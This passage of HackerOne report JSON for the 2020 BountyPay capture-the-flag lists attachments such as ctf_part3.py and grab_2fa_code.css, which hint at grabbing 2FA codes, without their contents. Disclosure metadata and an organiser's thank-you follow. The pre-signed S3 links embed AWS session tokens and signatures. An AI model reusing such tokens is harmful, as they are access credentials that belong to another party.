q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=4bae8010f5d9cf79cec1b1a72f339cafa9d84c32d1ea3ce7c1bdfad7cf8f49c5","file_size":1356,"type":"text/plain"},{"id":859852,"file_name":"ctf_part2.py","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/fZADTsJfEfdmEP1Phd94S2DS?response-content-disposition=attachment%3B%20filename%3D%22ctf_part2.py%22%3B%20filename%2A%3DUTF-8%27%27ctf_part2.py\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153914Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=d6e361d95bb0cb628daa613057175678f78124c2e07018c57004cfa1a08e0cba","file_size":1994,"type":"text/plain"},{"id":859853,"file_name":"grab_2fa_code.css","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/wy6RpAihjCtqvNFEDh8zuKko?response-content-disposition=attachment%3B%20filename%3D%22grab_2fa_code.css%22%3B%20filename%2A%3DUTF-8%27%27grab_2fa_code.css\u0026response-content-type=text%2Fcss\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153914Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=900df61bbad6b8035635e734445eae2753fb1b1995069e4a4b0ce466fd42d28f","file_size":59023,"type":"text/css"},{"id":859854,"file_name":"ctf_part3.py","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/MXJiXKQ9cpesTbteGJGqVPYP?response-content-disposition=attachment%3B%20filename%3D%22ctf_part3.py%22%3B%20filename%2A%3DUTF-8%27%27ctf_part3.py\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153914Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=1964c3ec91fa2dc3450437f8893c08fa84e1ff1366baa93d025f5b9c5d52ccad","file_size":2733,"type":"text/plain"},{"id":859855,"file_name":"find_code_input_fields.css","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/5yQCbFNitwPKas1LoKGx3ay9?response-content-disposition=attachment%3B%20filename%3D%22find_code_input_fields.css%22%3B%20filename%2A%3DUTF-8%27%27find_code_input_fields.css\u0026response-content-type=text%2Fcss\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153914Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=be6900bf5e2e0c5f250ba392a6f604c17cb0430616aae45275c41dc27140b58e","file_size":7253,"type":"text/css"},{"id":859856,"file_name":"fireworks.gif","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/AWSHrbABJ88e54i68owHUKnK?response-content-disposition=attachment%3B%20filename%3D%22fireworks.gif%22%3B%20filename%2A%3DUTF-8%27%27fireworks.gif\u0026response-content-type=image%2Fgif\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153914Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=d667fc37188a286184934c39c68fbfa660d98c90a31093abc953fdec124e17ee","file_size":481655,"type":"image/gif"},{"id":859857,"file_name":"PartThreeActivity.java","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/UUDQcXGt4LrNiSNjNzcGhrxf?response-content-disposition=attachment%3B%20filename%3D%22PartThreeActivity.java%22%3B%20filename%2A%3DUTF-8%27%27PartThreeActivity.java\u0026response-content-type=text%2Fx-java\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153914Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=a196d950e1d0e6377f50516b21e216a558e61af53b2f72b7e00cfa8710b9bb7b","file_size":12442,"type":"text/x-java"},{"id":859858,"file_name":"PartTwoActivity.java","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/omvKHAQdg6T2947xedpyTg5S?response-content-disposition=attachment%3B%20filename%3D%22PartTwoActivity.java%22%3B%20filename%2A%3DUTF-8%27%27PartTwoActivity.java\u0026response-content-type=text%2Fx-java\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153914Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c062e9bf768c724e2622d032b5339bbc140cf97f6e4cc056f97dc563f41e1df7","file_size":5455,"type":"text/x-java"},{"id":859859,"file_name":"PartOneActivity.java","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/sjC7HydKe68xJRniy7M2VJHo?response-content-disposition=attachment%3B%20filename%3D%22PartOneActivity.java%22%3B%20filename%2A%3DUTF-8%27%27PartOneActivity.java\u0026response-content-type=text%2Fx-java\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153914Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b256cae19ed1bdf9576b86995c6a07dd9a5cd412f73b5998e8b3d58cd91c2046","file_size":2957,"type":"text/x-java"}],"allow_singular_disclosure_at":"2020-07-17T23:47:12.435Z","allow_singular_disclosure_after":-38937121.76380654,"singular_disclosure_allowed":true,"vote_count":5,"voters":["nytr0gen","mvc","brahim_boufakri01","romesful","zeroxyele"],"structured_scope":{"databaseId":48138,"asset_type":"URL","asset_identifier":"*.bountypay.h1ctf.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8245281,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2020-06-09T17:10:16.553Z","updated_at":"2020-06-09T17:10:16.553Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8268319,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\n\nI wanted to personally thank you for participating in the #h12006 2020 CTF, I hope you enjoyed the challenge! We received tons of great submission and it definitely made our decision a lot harder than we excepted. Unfortunately, since we only have a limited number of invites available, your write up was not selected for this event. We appreciate your hard work and we hope to see you participate in our next CTF!\n\nWe will send you a request to publicly disclose your submissions next week, so please hold on to your writeups, we'll make sure to let you know when you can publish them on your site!\n\nIf you were one of the first 10 people to submit a write-up,  look out for some private invite in the next few days!","automated_response":false,"created_at":"2020-06-11T23:03:10.619Z","updated_at":"2020-06-11T23:03:10.619Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8324964,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you again for participating in the #h12006 CTF! ","automated_response":false,"created_at":"2020-06-17T22:28:13.038Z","updated_at":"2020-06-17T22:28:13.038Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"njbooher","url":"/njbooher"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8325918,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-06-17T23:47:12.405Z","updated_at":"2020-06-17T23:47:12.405Z","first_to_agree":true,"actor":{"username":"njbooher","cleared":true,"url":"/njbooher","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/8gBaXxZaVswNz1ZdTYSp5vLP/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8326012,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-06-18T00:09:28.191Z","updated_at":"2020-06-18T00:09:28.191Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8326013,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-06-18T00:09:28.295Z","updated_at":"2020-06-18T00:09:28.295Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}